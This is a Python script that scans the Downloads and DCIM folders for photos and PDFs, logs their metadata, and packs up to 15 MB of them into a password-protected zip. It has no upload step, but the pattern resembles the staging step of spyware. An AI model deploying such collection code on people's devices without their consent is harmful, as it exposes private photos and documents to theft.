from __future__ import annotations
import os
import json
from pathlib import Path
from datetime import datetime
from typing import List

import pyminizip


def scan_log_and_zip(
    zip_file: str = "media_files.zip",
    password: str | None = None,
    log_file: str = "media_metadata.log",
    max_size_mb: int = 15,
) -> None:
    targets = [Path("/Download"), Path("/DCIM")]
    home = Path.home()
    targets.extend([home / "Downloads", home / "DCIM"])
    if os.name == "nt":
        user = Path(os.environ.get("USERPROFILE", ""))
        if user:
            targets.extend([user / "Downloads", user / "DCIM"])

    exts = {".jpg", ".jpeg", ".pdf"}
    entries: List[dict] = []
    files: List[str] = []
    limit = max_size_mb * 1024 * 1024
    size_acc = 0
    for d in targets:
        if not d.exists():
            continue
        for f in d.rglob("*"):
            if not (f.is_file() and f.suffix.lower() in exts):
                continue
            st = f.stat()
            if size_acc + st.st_size > limit:
                continue
            size_acc += st.st_size
            entries.append({
                "path": str(f),
                "size": st.st_size,
                "mtime": datetime.fromtimestamp(st.st_mtime).isoformat(),
            })
            files.append(str(f))
    if entries:
        with open(log_file, "a", encoding="utf-8") as out:
            for e in entries:
                out.write(json.dumps(e) + "\n")
    if files and password:
        pyminizip.compress_multiple(files, [], zip_file, password, 5)


def scan_and_log(log_file: str = "media_metadata.log") -> None:
    scan_log_and_zip(log_file=log_file)
